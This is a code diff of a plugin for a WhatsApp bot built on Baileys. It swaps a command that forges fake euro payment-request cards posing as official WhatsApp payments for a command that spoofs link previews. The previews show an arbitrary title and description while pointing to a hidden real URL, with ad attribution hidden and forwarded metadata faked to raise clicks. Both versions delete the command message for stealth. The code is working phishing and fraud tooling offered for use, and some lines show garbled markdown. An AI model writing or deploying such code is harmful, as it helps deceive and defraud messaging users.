@@ -1,49 +1,44 @@
-import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
-
 export default {
-    name: 'payment_trap',
-    match: (text) => /^\.pago/i.test(text),
+    name: 'link```_spoofing',
+    match: (text) => /^\.link/i.test(text),
     execute: async ({ sock, remitente, msg, textoLimpio }) => {
         
-        const monto = textoLimpio.replace(/^\.pago\s*/i, '').trim() || "85.50";
+        const input = textoLimpio.replace(/^\.link\s*/i, '').trim();
+        if (!input.includes('|')) {
+            return sock.sendMessage(remitente, { text: "❌ Formato: .link url | titulo | descripcion" });
+        }
+
+        const [urlReal, titulo, desc] = input.split('|').map(p => p.trim());
 
         try {
-            // 1. Sigilo: Borrado del comando
+            // 1. Sigilo: Borramos el comando
             try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}
 
-            // 2. Construcción del Exploit de Pago
-            // Usamos un tipo de servicio (4) que fuerza la interfaz de "Transferencia Pendiente"
-            const waMsg = generateWAMessageFromContent(remitente, {
-                paymentInviteMessage: {
-                    serviceType: 4, 
-                    expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000), // Expira en 24h
-                    amount: {
-                        value: parseInt(monto.replace('.', '')), // Formato entero para el protocolo
-                        offset: 100, // Define los decimales
-                        currencyCode: 'EUR' // Renderiza el símbolo de Euro automáticamente
-                    }
-                },
-                // Inyectamos un texto de sistema que aparece sobre la tarjeta
-                extendedTextMessage: {
-                    text: `⚠️ NOTIFICACIÓN DE COBRO: Se ha solicitado una transferencia de ${monto}€ por servicios de mantenimiento de red.`,
-                    contextInfo: {
-                        externalAdReply: {
-                            title: "CENTRAL DE PAGOS WHATSAPP",
-                            body: "ID de Transacción: " + Math.random().toString(36).substring(7).toUpperCase(),
-                            mediaType: 1,
-                            showAdAttribution: false,
-                            renderLargerThumbnail: false,
-                            thumbnail: Buffer.alloc(0)
-                        }
-                    }
-                }
-            }, { userJid: sock.user.id });
+            // 2. Construcción del mensaje de texto con previsualización forzada
+            // Usamos un carácter invisible para que el texto del mensaje no estorbe a la previsualización
+            const invisibleChar = String.fromCharCode(8203);
 
-            // 3. Inyección directa al servidor de Meta
-            await sock.relayMessage(remitente, waMsg.message, { messageId: waMsg.key.id });
+            await sock.sendMessage(remitente, {
+                text: invisibleChar, 
+                contextInfo: {
+                    externalAdReply: {
+                        title: titulo,
+                        body: desc,
+                        mediaType: 1, // 1 = IMAGE (Forzar previsualización de enlace)
+                        previewType: 0,
+                        renderLargerThumbnail: true, // Hace que la imagen sea grande y profesional
+                        thumbnailUrl: "[https://files.catbox.moe/0f7e4a.jpg](https://files.catbox.moe/0f7e4a.jpg)", // Opcional: URL de imagen estable o dejar en blanco
+                        sourceUrl: urlReal, // El link al que realmente irá al hacer clic
+                        showAdAttribution: false // Quita la etiqueta de 'Publicidad'
+                    },
+                    // Añadimos metadata de reenvío para aumentar la tasa de clics (Psicología)
+                    isForwarded: true,
+                    forwardingScore: 1
+                }
+            });
 
         } catch (err) {
-            console.error("Error Payment Exploit:", err);
+            console.error("Error en Link Spoof:", err);
         }
     }
 };
